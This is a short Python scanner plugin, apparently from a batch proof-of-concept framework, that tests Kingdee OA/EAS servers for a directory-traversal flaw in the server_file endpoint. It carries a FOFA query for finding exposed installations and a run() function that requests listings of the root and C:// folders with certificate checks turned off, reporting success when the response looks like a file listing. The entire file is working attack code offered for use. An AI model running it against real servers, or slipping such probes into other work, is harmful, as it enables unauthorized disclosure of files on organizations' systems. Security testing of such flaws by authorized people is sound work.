#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://peiqi.wgpsec.org/wiki/oa/金蝶OA/金蝶OA server_file 目录遍历漏洞.html',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '金蝶OA server_file 目录遍历',

      'level'     :   'medium',

      'FOFA'      :   'app="Kingdee-EAS"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  targets = ['/appmonitor/protected/selector/server_file/files?folder=/&suffix=','appmonitor/protected/selector/server_file/files?folder=C://&suffix=','appmonitor/protected/selector/server_file/files?folder=/&suffix=']
  url1 = url + targets[0]
  url2 = url + targets[1]
  url3 = url + targets[2]
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if re.search(r'total.*?rows.*?name.*?path.*?folder.*?',res.text,re.S):
      ret['ifbug'] = True
      ret['url'] = url1
      res.close()
      return ret
  except:
    pass
  try:
    resp=requests.get(url=url2,headers=headers,timeout=5,verify=False)
    if re.search(r'total.*?rows.*?name.*?path.*?folder.*?',resp.text,re.S):
      ret['url'] = url2
      ret['ifbug'] = True
      resp.close()
      return ret
  except:
    pass
  try:
    req=requests.get(url=url3,headers=headers,timeout=5,verify=False)
    if re.search(r'total.*?rows.*?name.*?path.*?folder.*?',req.text,re.S):
      ret['ifbug'] = True
      ret['url'] = url3
      req.close()
      return ret
    else:
      return ret
  except:
    return ret